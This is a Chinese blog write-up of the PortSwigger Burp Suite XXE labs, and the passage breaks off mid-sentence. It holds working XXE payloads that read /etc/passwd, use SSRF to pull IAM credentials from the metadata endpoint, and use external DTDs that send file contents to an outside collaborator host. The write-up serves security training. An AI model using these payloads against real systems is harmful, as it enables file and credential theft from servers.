        <content type="html"><![CDATA[<p>最近做了burpsuite实验室的xxe实验，感觉收益匪浅，即学到了漏洞相关知识，也能够实战巩固。特此文章记录一下实验过程，也对相关知识点做一番讲解。</p><h1 id="1-xxe漏洞基础"><a href="#1-xxe漏洞基础" class="headerlink" title="1.xxe漏洞基础"></a>1.xxe漏洞基础</h1><p>xxe 全称是xml external entity，也就是xml外部实体注入攻击。漏洞是在对不安全的外部实体数据进行处理时引发的安全问题。</p><p>在了解xxe漏洞之前我们先来了解一些基础知识。</p><h3 id="1-1-什么是XML？"><a href="#1-1-什么是XML？" class="headerlink" title="1.1 什么是XML？"></a>1.1 什么是XML？</h3><p>XML代表“可扩展标记语言”。XML是一种设计用于存储和传输数据的语言。像HTML一样，XML主要有标签和数据构成。与HTML不同的是，XML不使用预定义标签，因此可以给标签指定任意名称，也就是自定义标签名。</p><p>在Web的早期历史中，XML是一种流行的数据传输格式（“ AJAX”中的“ X”就是代表“ XML”）。但是，现在传输数据主要使用json格式，流行程度以不如以前。</p><p>实列代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">receiver</span>&gt;</span>Myself<span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sender</span>&gt;</span>Someone<span class="tag">&lt;/<span class="name">sender</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">header</span>&gt;</span>TheReminder<span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">msg</span>&gt;</span>This is an amazing book<span class="tag">&lt;/<span class="name">msg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="1-2-什么是XML实体？"><a href="#1-2-什么是XML实体？" class="headerlink" title="1.2.什么是XML实体？"></a>1.2.什么是XML实体？</h3><p>XML实体是一种表示XML文档中数据项的表现方式，而不是使用数据本身。XML语言规范内置了各种实体。</p><p>例如，实体<code>&amp;lt;</code>和<code>&amp;gt;</code>代表字符&lt;和&gt;。</p><p>这些是用于表示XML标签的元字符，因此，当它们出现在数据中时，为了不破坏xml结构，通常必须使用它们的实体来表示它们。</p><p>例如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line">    //xml实体引用</span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">pass</span>&gt;</span>mypass<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="1-3-什么是文档类型定义（DTD-？"><a href="#1-3-什么是文档类型定义（DTD-？" class="headerlink" title="1.3.什么是文档类型定义（DTD)？"></a>1.3.什么是文档类型定义（DTD)？</h3><p>XML文档类型定义（DTD）包含一些声明，这些声明可以定义XML文档的结构，和数据值的类型以及其他项。</p><p>DTD DOCTYPE在XML文档开始处的可选元素中声明。DTD可以完全独立于文档本身（“内部DTD”），也可以从其他位置加载（“外部DTD”），也可以将两者混合使用。</p><p>实列代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;//这一行是 XML 文档定义</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;</span><br><span class="line">&lt;!ELEMENT receiver (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT sender (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT header (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT msg (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><p>上面这个 DTD 就定义了 XML 的根元素是 message，然后根元素下面有一些子元素。如果引用了该dtd，那么xml文档必须这么写：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">receiver</span>&gt;</span>Myself<span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sender</span>&gt;</span>Someone<span class="tag">&lt;/<span class="name">sender</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">header</span>&gt;</span>TheReminder<span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">msg</span>&gt;</span>This is an amazing book<span class="tag">&lt;/<span class="name">msg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="1-4-什么是XML自定义实体？"><a href="#1-4-什么是XML自定义实体？" class="headerlink" title="1.4.什么是XML自定义实体？"></a>1.4.什么是XML自定义实体？</h3><p>XML允许在DTD中定义自定义实体。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ &lt;!ENTITY myentity &quot;my entity value&quot; &gt; ]&gt;</span><br></pre></td></tr></table></figure><p>此定义意味着xml文档中引用<code>&amp;myentity</code> ,此值将会被“ my entity value” 替换。</p><p>也就是: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;myentity;=my entity value</span><br></pre></td></tr></table></figure><h3 id="1-5-什么是XML外部实体？"><a href="#1-5-什么是XML外部实体？" class="headerlink" title="1.5.什么是XML外部实体？"></a>1.5.什么是XML外部实体？</h3><p>XML外部实体是一种自定义实体，其定义位于声明它们的DTD之中。</p><p>外部实体的声明使用SYSTEM关键字，并且必须指定一个URL，从该URL可以加载实体的值。例如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">ext</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://normal-website.com/entity.dtd&quot;</span> &gt;</span> ]&gt;</span></span><br></pre></td></tr></table></figure><p>从<code>http://normal-website.com/entity.dtd</code>加载自定义实体。</p><p>URL可以使用该file://协议，因此可以从文件中加载外部实体。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;file:///path/to/file&quot; &gt; ]&gt;</span><br></pre></td></tr></table></figure><p>xxe漏洞的来源主要就是因为此处的加载外部实体，如果将url更改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/passwd</span><br></pre></td></tr></table></figure><p>即可加载本地passwd文件，造成任意文件读取。</p><p>了解了基础知识那就进入正题，来看看xxe的攻击方式和挖掘方式。这里主要采用burpsuite实验室漏洞作为讲解。</p><p>burpsuite实验室地址：<a href="https://portswigger.net/web-security/xxe">https://portswigger.net/web-security/xxe</a></p><h1 id="2-xxe实战"><a href="#2-xxe实战" class="headerlink" title="2.xxe实战"></a>2.xxe实战</h1><h3 id="2-1-利用xxe读取任意文件"><a href="#2-1-利用xxe读取任意文件" class="headerlink" title="2.1 利用xxe读取任意文件"></a>2.1 利用xxe读取任意文件</h3><p>在渗透测试时，如果发现传输的数据包存在xml格式的数据。可以重点测试xxe漏洞。</p><p>在检查库存处抓包，发现xml格式数据</p><p><img src="2.1.1.png" alt="2.1.1"></p><p>测试xxe读取任意文件：</p><p>exp:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">stockCheck</span>&gt;</span><span class="tag">&lt;<span class="name">productId</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">productId</span>&gt;</span><span class="tag">&lt;<span class="name">storeId</span>&gt;</span>1<span class="tag">&lt;/<span class="name">storeId</span>&gt;</span><span class="tag">&lt;/<span class="name">stockCheck</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="2.1.2.png" alt="2.1.2"></p><p>成功读取到passwd文件。</p><p>exp解释：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line">//自定义外部实体xxe</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"></span><br><span class="line">//引用<span class="symbol">&amp;xxe;</span>外部实体</span><br><span class="line">//服务器请求了定义的<span class="symbol">&amp;xxe;</span>外部实体</span><br><span class="line"><span class="tag">&lt;<span class="name">stockCheck</span>&gt;</span><span class="tag">&lt;<span class="name">productId</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">productId</span>&gt;</span><span class="tag">&lt;<span class="name">storeId</span>&gt;</span>1<span class="tag">&lt;/<span class="name">storeId</span>&gt;</span><span class="tag">&lt;/<span class="name">stockCheck</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-2-利用xxe执行ssrf"><a href="#2-2-利用xxe执行ssrf" class="headerlink" title="2.2 利用xxe执行ssrf"></a>2.2 利用xxe执行ssrf</h3><p>外部实体能够引用外部url，自然也能够引用内网里的url，那么就可以造成ssrf攻击。</p><p>实验要求利用xxe进行ssrf攻击，并给了ip地址为：<code>http://169.254.169.254/</code></p><p>此时我们可以尝试使用ssrf探测该ip的敏感路径。</p><p>poc:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://169.254.169.254/&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">stockCheck</span>&gt;</span><span class="tag">&lt;<span class="name">productId</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">productId</span>&gt;</span><span class="tag">&lt;<span class="name">storeId</span>&gt;</span>1<span class="tag">&lt;/<span class="name">storeId</span>&gt;</span><span class="tag">&lt;/<span class="name">stockCheck</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="2.2.1.png" alt="2.1.3"></p><p>报错：无效的产品ID latest</p><p>尝试加上/latest</p><p><img src="2.2.2.png" alt="2.2.2"></p><p>报错：无效的产品ID meta-data</p><p>依次按照报错提示添加参数….</p><p>完整路径为：/latest/meta-data/iam/security-credentials/admin</p><p><img src="2.2.3.png" alt="2.2.3"></p><p>最后访问/latest/meta-data/iam/security-credentials/admin 路径即可得到密钥</p><h3 id="2-3-利用XInclude检索文件"><a href="#2-3-利用XInclude检索文件" class="headerlink" title="2.3 利用XInclude检索文件"></a>2.3 利用XInclude检索文件</h3><p><strong>XInclude攻击</strong></p><p>一些应用程序接收客户端提交的数据，将其在服务器端嵌入到XML文档中，然后解析该文档。将客户端提交的数据放入后端SOAP请求中，然后由后端SOAP服务处理该请求时，就会发生这种情况。</p><p>在这种情况下，无法进行经典的XXE攻击，因为无法控制整个XML文档，因此无法定义或修改DOCTYPE元素。</p><p>但是，也许可以使用XInclude代替。XInclude是XML规范的一部分，该规范允许从子文档构建XML文档。可以在XML文档中的任何部分使用XInclude进行攻击，因此可以在仅控制输出到服务器端XML文档中的单个数据项的情况下执行攻击。</p><p>要进行XInclude攻击，需要引用XInclude名称空间并提供要包含的文件的路径。例如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">parse</span>=<span class="string">&quot;text&quot;</span> <span class="attr">href</span>=<span class="string">&quot;file:///etc/passwd&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span> </span><br></pre></td></tr></table></figure><p>实验：</p><p>库存检索按钮处抓包：</p><p><img src="2.3.1.png" alt="2.3.1"></p><p>虽然没有xml格式数据，但是此时也可能存在xxe漏洞</p><p>检测poc:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">productId=<span class="tag">&lt;<span class="name">foo</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">parse</span>=<span class="string">&quot;text&quot;</span> <span class="attr">href</span>=<span class="string">&quot;file:///etc/passwd&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span>&amp;storeId=1</span><br></pre></td></tr></table></figure><p><img src="2.3.2.png" alt="2.3.2"></p><h3 id="2-4-通过文件上传进行xxe"><a href="#2-4-通过文件上传进行xxe" class="headerlink" title="2.4 通过文件上传进行xxe"></a>2.4 通过文件上传进行xxe</h3><p>一些应用程序允许用户上传文件，然后在服务器端进行处理。一些常见的文件格式使用XML或包含XML子组件。基于XML格式的示例是Office文档格式（如DOCX）和图像格式（如SVG）。</p><p>攻击实列：</p><p>一个应用程序可能允许用户上传图像，并在上传后在服务器上处理或验证这些图像。虽然应用程序希望接收PNG或JPEG之类的格式，但是使用的图像处理库可能也支持SVG图像。由于SVG格式使用XML，因此攻击者可以提交恶意的SVG图像，从而造成XXE漏洞攻击。</p><p><strong>实验：</strong></p><p>文章评论处可以上传图片，发现可以上传svg格式的图像</p><p>尝试进行xxe攻击</p><p>构成exp：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/hostname&quot;</span> &gt;</span> ]&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;128px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;128px&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">text</span> <span class="attr">font-size</span>=<span class="string">&quot;16&quot;</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;16&quot;</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将exp保存为svg格式：</p><p><img src="2.4.1.png" alt="2.4.1"></p><p>上传文件，</p><p>在评论，头像处可以看到file:///etc/hostname内容</p><p><img src="2.4.2.png" alt="2.4.2"></p><h3 id="2-5-利用信息回显验证xxe"><a href="#2-5-利用信息回显验证xxe" class="headerlink" title="2.5 利用信息回显验证xxe"></a>2.5 利用信息回显验证xxe</h3><p>检查库存功能发送的数据包中含有xml数据，猜测存在xxe漏洞</p><p><img src="2.5.1.png" alt="2.5.1"></p><p>但是响应包中并没有回显。</p><p>使用burp collaborator客户端，接收请求数据，验证xxe</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://58bn8ko65cvhivtgqb6wpfjxbohe53.burpcollaborator.net&quot;</span>&gt;</span> ]&gt;</span> <span class="tag">&lt;<span class="name">stockCheck</span>&gt;</span><span class="tag">&lt;<span class="name">productId</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">productId</span>&gt;</span><span class="tag">&lt;<span class="name">storeId</span>&gt;</span>1<span class="tag">&lt;/<span class="name">storeId</span>&gt;</span><span class="tag">&lt;/<span class="name">stockCheck</span>&gt;</span></span><br></pre></td></tr></table></figure><p>接收到响应，说明存在不回显的xxe</p><p><img src="2.5.2.png" alt="2.5.2"></p><p>poc解释：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line">//引用外部实体处,填入 burp collaborator客户端地址</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://58bn8ko65cvhivtgqb6wpfjxbohe53.burpcollaborator.net&quot;</span>&gt;</span> ]&gt;</span> <span class="tag">&lt;<span class="name">stockCheck</span>&gt;</span><span class="tag">&lt;<span class="name">productId</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">productId</span>&gt;</span><span class="tag">&lt;<span class="name">storeId</span>&gt;</span>1<span class="tag">&lt;/<span class="name">storeId</span>&gt;</span><span class="tag">&lt;/<span class="name">stockCheck</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-6-通过XML参数实体进行带外交互的盲XXE"><a href="#2-6-通过XML参数实体进行带外交互的盲XXE" class="headerlink" title="2.6 通过XML参数实体进行带外交互的盲XXE"></a>2.6 通过XML参数实体进行带外交互的盲XXE</h3><p>有时，由于应用程序进行了某些输入验证或所用XML解析器的某些防护，使用常规实体的XXE攻击被阻止了。在这种情况下，可以改为使用XML参数实体。XML参数实体是一种特殊的XML实体，只能在DTD中的其他地方引用。就目前的目的而言，只需要知道两件事。首先，XML参数实体的声明在实体名称之前包含百分比字符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % myparameterentity &quot;my parameter entity value&quot; &gt;</span><br></pre></td></tr></table></figure><p>其次，使用百分号而不是通常的&amp;号来引用参数实体：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%myparameterentity;</span><br></pre></td></tr></table></figure><p>这意味着可以通过XML参数实体使用带外检测来测试盲XXE，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM &quot;http://f2g9j7hhkax.web-attacker.com&quot;&gt; %xxe; ]&gt;</span><br></pre></td></tr></table></figure><p>此XXE有效负载声明一个XML参数实体<code>xxe</code>，然后在DTD中使用该实体。这将导致对攻击者域的DNS查找和HTTP请求，从而验证攻击是否成功。</p><p>实验：</p><p>和实验5类似，只是将&amp;符号换位%。</p><p>poc:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [ <span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://t93h08q29o1vsw03hbagwf6q6hc70w.burpcollaborator.net&quot;</span>&gt;</span> %xxe; ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">stockCheck</span>&gt;</span><span class="tag">&lt;<span class="name">productId</span>&gt;</span>%xxe<span class="tag">&lt;/<span class="name">productId</span>&gt;</span><span class="tag">&lt;<span class="name">storeId</span>&gt;</span>1<span class="tag">&lt;/<span class="name">storeId</span>&gt;</span><span class="tag">&lt;/<span class="name">stockCheck</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="2.6.1.png" alt="2.6.1"></p><h3 id="2-7-盲打xxe利用外部恶意DTD，获取敏感数据"><a href="#2-7-盲打xxe利用外部恶意DTD，获取敏感数据" class="headerlink" title="2.7 盲打xxe利用外部恶意DTD，获取敏感数据"></a>2.7 盲打xxe利用外部恶意DTD，获取敏感数据</h3><p>实验五和实验六只是验证了xxe漏洞的存在，并没有利用xxe造成攻击。该实验将演示盲打xxe如何获取敏感数据。</p><p><strong>1. 首先在可控制服务器部署dtd文件，内容为：</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/hostname&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">eval</span> <span class="meta-string">&quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#x27;http://m0nto7pg0wegiq1yunxknsnullrcf1.burpcollaborator.net/?x=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate;</span><br></pre></td></tr></table></figure><p>该DTD执行以下步骤：</p><ul><li>定义名为file的XML参数实体，其中包含/etc/hostname文件的内容。</li><li>定义一个名为eval的XML参数实体，其中包含另一个名为<code>&amp;#x25;</code>  (<code>&amp;#x25;</code>为%的实体)  的XML参数实体的动态声明exfiltrate。</li><li>该exfiltrate实体将通过http请求<code>http://m0nto7pg0wegiq1yunxknsnullrcf1.burpcollaborator.net</code>并在后面带上x=%file参数。而%file参数的值为<code>file:///etc/hostname</code></li><li>使用eval实体，这将导致exfiltrate执行实体的动态声明。</li><li>使用exfiltrate实体，通过请求指定的URL来获取指定内容。</li></ul><p>在利用服务器，将exp存储到服务器，注意将文件名更改为/exploit.dtd。最后点击store即可存储到dtd文件。</p><p><img src="2.7.1.png" alt="2.7.1"></p><p><strong>2. xxe，访问攻击服务器部署的dtd文件</strong></p><p>poc:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [ <span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;https://ac6f1fce1f241d918045d10f01e3006b.web-security-academy.net/exploit.dtd&quot;</span>&gt;</span> %xxe; ]&gt;</span> <span class="tag">&lt;<span class="name">stockCheck</span>&gt;</span><span class="tag">&lt;<span class="name">productId</span>&gt;</span>%xxe<span class="tag">&lt;/<span class="name">productId</span>&gt;</span><span class="tag">&lt;<span class="name">storeId</span>&gt;</span>1<span class="tag">&lt;/<span class="name">storeId</span>&gt;</span><span class="tag">&lt;/<span class="name">stockCheck</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>https://ac6f1fce1f241d918045d10f01e3006b.web-security-academy.net/exploit.dtd</code> 该路径为dtd文件存储的路径。</p><p><img src="2.7.2.png" alt="2.7.2"></p><p><strong>3. burp collaborator客户端接收到file:///etc/hostname内容</strong></p><p><img src="2.7.3.png" alt="2.7.3"></p><h3 id="2-8-盲打xxe通过报错获取敏感信息"><a href="#2-8-盲打xxe通过报错获取敏感信息" class="headerlink" title="2.8 盲打xxe通过报错获取敏感信息"></a>2.8 盲打xxe通过报错获取敏感信息</h3><p>利用盲打XXE的另一种方法是触发XML分析错误，其中错误消息包含您希望检索的敏感数据。如果应用程序在其响应内返回生成的错误消息，将泄露敏感信息。</p><p><strong>1. 攻击服务器部署恶意dtd文件</strong></p><p>poc内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">eval</span> <span class="meta-string">&quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%eval;</span><br><span class="line">%error;</span><br></pre></td></tr></table></figure><ul><li>定义名为file的XML参数实体，其中包含/etc/passwd文件的内容。</li><li>定义一个名为eval的XML参数实体，其中包含另一个名为error的XML参数实体的动态声明。该error实体将通过加载一个不存在的文件名来引发错误，并且<code>%file</code>将加载<code>file:///etc/passwd</code>的内容</li><li>使用eval实体，这将导致error执行实体的动态声明。</li><li>使用error实体，通过尝试加载不存在的文件来产生一条错误消息，其中包含不存在的文件的名称，将包含<code>%file</code>的内容/etc/passwd。</li></ul><p>向实验七一样部署在burp实验室利用服务器中。</p><p><strong>2. xxe，访问部署的dtd文件</strong></p><p>poc:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [ <span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;https://ac751ffa1eab9ea0802029da01870006.web-security-academy.net/exploit.dtd&quot;</span>&gt;</span> %xxe; ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">stockCheck</span>&gt;</span><span class="tag">&lt;<span class="name">productId</span>&gt;</span>%xxe<span class="tag">&lt;/<span class="name">productId</span>&gt;</span><span class="tag">&lt;<span class="name">storeId</span>&gt;</span>1<span class="tag">&lt;/<span class="name">storeId</span>&gt;</span><span class="tag">&lt;/<span class="name">stockCheck</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="2.8.1.png" alt="2.8.1"></p><h3 id="2-9-盲打xxe利用本地的dtd文件获取敏感数据"><a href="#2-9-盲打xxe利用本地的dtd文件获取敏感数据" class="headerlink" title="2.9 盲打xxe利用本地的dtd文件获取敏感数据"></a>2.9 盲打xxe利用本地的dtd文件获取敏感数据</h3><p><strong>当带外交互被阻止时，XXE盲目漏洞又如何呢？</strong></p><p>无法通过带外连接窃取数据，也无法从远程服务器加载外部DTD。</p><p>在这种情况下，由于XML语言规范中的漏洞，仍有可能触发包含敏感数据的错误消息。如果文档的DTD使用内部和外部DTD声明的混合体，则内部DTD可以重新定义在外部DTD中声明的实体。</p><p>发生这种情况时，放宽了在另一个参数实体的定义中使用XML参数实体的限制。</p><p>这意味着，如果攻击者使用的XML参数实体重新定义了在外部DTD中声明的实体，则攻击者可以在内部DTD中采用<a href="https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages">基于错误的XXE</a>技术。</p><p>当然，如果阻塞了带外连接，则无法从远程位置加载外部DTD。相反，它必须是应用程序服务器本地的外部DTD文件。本质上，攻击涉及调用本地文件系统上恰好存在的DTD文件，然后重新触发该文件以重新定义现有实体，从而触发包含敏感数据的解析错误。该技术由Arseniy 